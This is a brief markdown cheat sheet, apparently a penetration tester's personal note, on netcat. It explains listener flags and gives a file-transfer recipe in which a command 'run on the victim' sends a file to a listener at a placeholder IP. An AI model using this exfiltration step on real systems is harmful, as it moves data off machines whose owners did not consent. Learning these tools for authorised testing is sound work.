---
title: "netcat"
tags:
  - fetus
---
## usage:
#### listening

```zsh
nc -nvlp 1337
```
- `-n` : no DNS just raw IP
- `-v` : verbose 
- `-l` : listen mode 
- `-p` : specifies the port to listen on
#### file transfers 
- run this on the local machine 
```sh
nc -nvlp port > fileName
```
- run this on the victim with the file to transfer 
```sh
nc IP port < fileToTransfer
```
